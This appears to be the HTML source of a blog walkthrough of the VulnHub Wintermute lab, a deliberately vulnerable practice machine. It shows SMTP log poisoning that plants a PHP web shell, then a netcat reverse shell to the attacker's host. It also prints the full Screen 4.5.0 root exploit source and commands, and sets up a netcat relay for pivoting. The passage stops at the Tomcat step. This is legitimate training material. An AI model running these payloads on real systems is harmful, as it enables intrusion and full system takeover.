@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Wintermute
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Wintermute" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation." />
+<meta property="og:description" content="Description: A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation." />
+<link rel="canonical" href="http://localhost:4000/wintermute.html" />
+<meta property="og:url" content="http://localhost:4000/wintermute.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/wintermute.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-26T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/wintermute.html" />
+<meta property="twitter:title" content="VulnHub - Wintermute" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Wintermute","dateModified":"2021-12-26T00:00:00-05:00","datePublished":"2021-12-26T00:00:00-05:00","url":"http://localhost:4000/wintermute.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/wintermute.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Wintermute</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>December 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation.</p>
+
+<p><strong>Author:</strong> creosote</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root on both machines.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan detected the target host on the local network, the script used can be found <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
+192.168.179.180 <span class="o">=&gt;</span> up
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>The full TCP port scan with nmap detected three available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> 192.168.179.180 <span class="nt">-oA</span> nmap/all-tcp-ports
+...
+PORT     STATE SERVICE
+25/tcp   open  smtp
+80/tcp   open  http
+3000/tcp open  ppp
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>In order to get more information about the target an aggressive scan was performed on open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p25</span>,80,3000 192.168.179.180 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE         VERSION                                                                                                                              
+25/tcp   open  smtp            Postfix smtpd                                                                                                                        
+|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,                                         
+80/tcp   open  http            Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>                                                                                                       
+| http-methods:                                                                                                                                                     
+|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                        
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>                                                                                                                        
+|_http-title: Night City                                                                                                                                            
+3000/tcp open  hadoop-datanode Apache Hadoop                                                                                                                        
+| hadoop-datanode-info: 
+|_  Logs: submit
+| hadoop-tasktracker-info: 
+|_  Logs: submit
+|_http-favicon: Unknown favicon MD5: 7FC0953320A93F3BC71770C25A7F4716
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Welcome to ntopng
+|_Requested resource was /lua/login.lua?referer<span class="o">=</span>/
+|_http-trane-info: Problem with XML parsing of /evox/about
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><strong>Enumeration on port 80</strong></p>
+
+<p>On the home page there is not much to see, so to find some hidden web content I ran gobuster.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.180/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> html,php,txt
+...
+http://192.168.179.180/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 326]
+http://192.168.179.180/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.180/manual/]
+http://192.168.179.180/freeside             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.180/freeside/]
+http://192.168.179.180/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
+</code></pre></div></div>
+
+<p>In the <strong>freeside</strong> directory there is a page with an image, nothing was found when listing in this directory.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-2.png" alt="" /></p>
+
+<p><strong>Enumeration on port 3000</strong></p>
+
+<p>On port 3000 there is an ntopng web form, we log in with admin as username and password.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/wintermute/screenshot-4.png" alt="" /></p>
+
+<p>Browsing the web page clicking on the <strong>Flows</strong> tab I found a table that contains two directories, the one we know is <strong>/freeside/</strong>, and the other is <strong>/turing-bolo/</strong>, as we can see these are running on port 80.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-5.png" alt="" /></p>
+
+<p>We access the <strong>/turing-bolo</strong> directory on port 80 and it greets us with a web page, then we look for the user <strong>Case</strong> to see the activity log.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-6.png" alt="" /></p>
+
+<p>We can see a message for the user <strong>Case</strong>, and the other available members.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-7.png" alt="" /></p>
+
+<p>This page is including files with <strong>.log</strong> extension, through the <strong>bolo</strong> parameter we include the <strong>/var/log/mail.log</strong> file without the extension, and we can see the logs from SMTP service.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-8.png" alt="" /></p>
+
+<p>We can inject php code into the SMTP log file, we insert the <strong>phpinfo()</strong> function to connect to the SMTP service on port 25.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-v</span> 192.168.179.180 25
+straylight <span class="o">[</span>192.168.179.180] 25 <span class="o">(</span>smtp<span class="o">)</span> open
+220 straylight ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
+VRFY &lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;
+501 5.1.3 Bad recipient address syntax
+</code></pre></div></div>
+
+<p>We loaded the web page, and we can see that the php code is executing.</p>
+
+<p><img src="/assets/images/wintermute/screenshot-9.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="smtp-log-poisoning">SMTP Log Poisoning</h3>
+
+<p>Using the above procedure we inject a web shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-v</span> 192.168.179.180 25
+straylight <span class="o">[</span>192.168.179.180] 25 <span class="o">(</span>smtp<span class="o">)</span> open
+220 straylight ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
+VRFY &lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
+501 5.1.3 Bad recipient address syntax
+</code></pre></div></div>
+
+<p>We check that the <strong>id</strong> command is being executed correctly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=id"</span> | <span class="nb">grep</span> <span class="s1">'Illegal'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">":"</span> <span class="s1">'{print $NF}'</span>
+ <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We check that netcat is installed on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=whereis nc"</span> | <span class="nb">grep</span> <span class="s1">'Illegal'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +2 | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">":"</span> <span class="s1">'{print $NF}'</span>
+ /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
+</code></pre></div></div>
+
+<p>We start a netcat listener on port 433, and execute the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail"</span> <span class="nt">--data</span> <span class="s2">"cmd=nc 192.168.179.1 443 -e /bin/bash"</span>
+</code></pre></div></div>
+
+<p>We have a shell with privileges of user www-data.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.180] 38922
+python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+www-data@straylight:/var/www/html/turing-bolo<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>When listing the SUID binaries, screen-4.5.0 was detected, this is a vulnerable version that allows privilege escalation.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/home/turing-police<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+&lt;uring-police<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/bin/screen-4.5.0
+/bin/ping
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+www-data@straylight:/home/turing-police<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="screen-450">Screen 4.5.0</h3>
+
+<p>The vulnerability consists in that the check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root access in several ways.</p>
+
+<p>We download the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/41154 <span class="nt">-O</span> exploit.sh
+</code></pre></div></div>
+
+<p>I broke down the exploit, so it was not possible to run it directly.</p>
+
+<p>libhax.c</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>rootshell.c</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We verify that gcc is installed on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/var/www/html/turing-bolo<span class="nv">$ </span>which gcc
+which gcc
+/usr/bin/gcc
+www-data@straylight:/var/www/html/turing-bolo<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We start a python web server on port 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Then, we transfer the c lenguage files to the victim machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/tmp<span class="nv">$ </span>wget 192.168.179.1/<span class="o">{</span>libhax.c,rootshell.c<span class="o">}</span>
+</code></pre></div></div>
+
+<p>We compile them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/tmp<span class="nv">$ </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/libhax.so /tmp/libhax.c 
+www-data@straylight:/tmp<span class="nv">$ </span>gcc <span class="nt">-o</span> /tmp/rootshell /tmp/rootshell.c
+</code></pre></div></div>
+
+<p>We execute the following commands and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@straylight:/etc<span class="nv">$ </span><span class="nb">cd</span> /etc
+<span class="nb">cd</span> /etc
+www-data@straylight:/etc<span class="nv">$ </span><span class="nb">umask </span>000
+<span class="nb">umask </span>000
+www-data@straylight:/etc<span class="nv">$ </span>/bin/screen-4.5.0 <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
+&lt; <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
+www-data@straylight:/etc<span class="nv">$ </span>/bin/screen-4.5.0 <span class="nt">-ls</span>
+/bin/screen-4.5.0 <span class="nt">-ls</span>
+<span class="s1">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@straylight:/etc$ /tmp/rootshell
+/tmp/rootshell
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</span></code></pre></div></div>
+
+<p>We read the flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+python <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+root@straylight:/etc# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@straylight:/root# <span class="nb">ls
+ls
+</span>flag.txt  note.txt  scripts
+root@straylight:/root# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+5ed185fd75a8d6a7056c96a436c6d8aa
+</code></pre></div></div>
+
+<p>We found a note containing a message about a Tomcat web service and a directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">cat </span>note<span class="k">*</span>
+<span class="nb">cat </span>note<span class="k">*</span>
+Devs,
+
+Lady 3Jane has asked us to create a custom java app on Neuromancer<span class="s1">'s primary server to help her interact w/ the AI via a web-based GUI.
+
+The engineering team couldn'</span>t strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can <span class="k">do</span><span class="nb">.</span>
+
+Anyways, we<span class="s1">'ve deployed the war file on tomcat as ordered - located here:
+
+/struts2_2.3.15.1-showcase
+
+It'</span>s ready <span class="k">for </span>the devs to customize to her liking...I<span class="s1">'m stating the obvious, but make sure to secure this thing.
+
+Regards,
+
+Bob Laugh
+Turing Systems Engineer II
+Freeside//Straylight//Ops5
+</span></code></pre></div></div>
+
+<p>We list the network interfaces.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root/scripts# ifconfig
+ifconfig
+enp0s3: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.179.181  netmask 255.255.255.0  broadcast 192.168.179.255
+        inet6 fe80::a00:27ff:fe83:6d5c  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 08:00:27:83:6d:5c  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 2271  bytes 231817 <span class="o">(</span>226.3 KiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2981  bytes 276415 <span class="o">(</span>269.9 KiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::a00:27ff:fe92:ffec  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 08:00:27:92:ff:ec  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 24  bytes 6942 <span class="o">(</span>6.7 KiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 26  bytes 3762 <span class="o">(</span>3.6 KiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1  <span class="o">(</span>Local Loopback<span class="o">)</span>
+        RX packets 19907  bytes 2079525 <span class="o">(</span>1.9 MiB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 19907  bytes 2079525 <span class="o">(</span>1.9 MiB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<h2 id="information-gathering-1">Information Gathering</h2>
+<h3 id="host-discovery-1">Host Discovery</h3>
+
+<p>We discovered our next target <strong>192.168.56.104</strong> on another network with the following bash oneliner.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/tmp# <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 255<span class="si">)</span><span class="p">;</span> <span class="k">do </span>ping <span class="nt">-c</span> 1 192.168.56.<span class="nv">$n</span> <span class="o">&gt;</span>&amp;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Host 192.168.56.</span><span class="nv">$n</span><span class="s2"> up"</span><span class="p">;</span> <span class="k">done</span>
+&lt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Host 192.168.56.</span><span class="nv">$n</span><span class="s2"> up"</span><span class="p">;</span> <span class="k">done</span>
+<span class="o">[</span>+] Host 192.168.56.1 up
+<span class="o">[</span>+] Host 192.168.56.100 up
+<span class="o">[</span>+] Host 192.168.56.104 up
+<span class="o">[</span>+] Host 192.168.56.105 up
+root@straylight:/root#
+</code></pre></div></div>
+
+<h3 id="port-scanning-1">Port Scanning</h3>
+
+<p>I developed a python port scanner to discover open ports.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.56.104"</span>
+
+<span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">scan</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Port {} open"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>We start a web server with python on port 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>On target machine we download the port scanner, give it execution permissions and execute it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# wget 192.168.179.1/pscan.py
+
+root@straylight:/root# <span class="nb">chmod</span> +x pscan.py
+<span class="nb">chmod</span> +x pscan.py
+root@straylight:/root# ./pscan.py
+./pscan.py
+<span class="o">[</span>+] Port 8009 open
+<span class="o">[</span>+] Port 8080 open
+<span class="o">[</span>+] Port 34483 open
+root@straylight:/root#
+</code></pre></div></div>
+
+<h3 id="service-enumeration-1">Service Enumeration</h3>
+
+<p>We check the banner on port 8009 with telnet but the service was not detected.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 8009
+telnet 192.168.56.104 8009
+Trying 192.168.56.104...
+Connected to 192.168.56.104.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+
+Connection closed by foreign host.
+root@straylight:/root#
+</code></pre></div></div>
+
+<p>The banner reveals that a web server is running on port 8080.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 8080
+telnet 192.168.56.104 8080
+Trying 192.168.56.104...
+Connected to 192.168.56.104.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+HEAD / HTTP/1.0
+
+HTTP/1.1 200 
+Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+Date: Wed, 26 Jan 2022 01:32:08 GMT
+Connection: close
+
+Connection closed by foreign host.
+root@straylight:/root# 
+</code></pre></div></div>
+
+<p>And on port 34483 we see that SSH is running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# telnet 192.168.56.104 34483
+telnet 192.168.56.104 34483
+Trying 192.168.56.104...
+Connected to 192.168.56.104.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+
+
+Protocol mismatch.
+Connection closed by foreign host.
+root@straylight:/root#
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-port-8080">Web Enumeration on port 8080</h3>
+
+<p>To set up a netcat relay for pivoting we execute the following commands.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">mknod</span> /tmp/backpipe p 
+root@straylight:/root# nc <span class="nt">-lp</span> 8080 &lt; /tmp/backpipe | nc 192.168.56.104 8080 <span class="o">&gt;</span> /tmp/backpipe
+</code></pre></div></div>
+
+<p>This establishes a netcat listener on port 8080, the netcat listener pipes any traffic it receives to the netcat client which forwards the traffic to port 8080 on the target web server 192.168.56.104.</p>
+
+<p>Now on the attacking machine we can browse the tomcat web page.</p>
+
